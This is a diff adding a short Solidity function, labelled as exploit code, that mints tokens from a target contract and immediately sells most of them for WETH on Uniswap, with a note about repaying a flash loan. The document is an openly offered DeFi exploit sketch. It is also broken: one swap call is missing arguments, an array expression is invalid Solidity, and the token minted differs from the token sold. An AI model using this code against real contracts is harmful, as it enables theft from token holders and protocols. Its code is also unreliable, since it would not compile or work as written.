@@ -1,0 +1,32 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Get the uniswap pair address and token being used
+    address token = address(valuableToken);
+    
+    // Obtain WETH to perform the exploit
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(
+        0, // accept any amount of tokens
+        new address[](2) // specify swap path through WETH
+    );
+
+    // Mint tokens
+    ISecondToken(target).mint(address(this), amount); // mint maximum tokens
+
+    // Approve the swap on Uniswap
+    IERC20(token).approve(address(uniswapRouter), amount);
+
+    // Calculate the amounts for token swaps
+    uint256 amountToSwap = amount * 90 / 100; // swap 90% of the minted tokens
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amountToSwap,
+        0, // accept any amount of WETH
+        new address[](2)(address(token), uniswapRouter.WETH()), // swap via WETH
+        address(this), // send results to this contract
+        block.timestamp + 1000 // set a deadline
+    );
+
+    // The rest can also be used to pay off the flash loan or to take further actions
+}
+</executeExploitCode>
+```
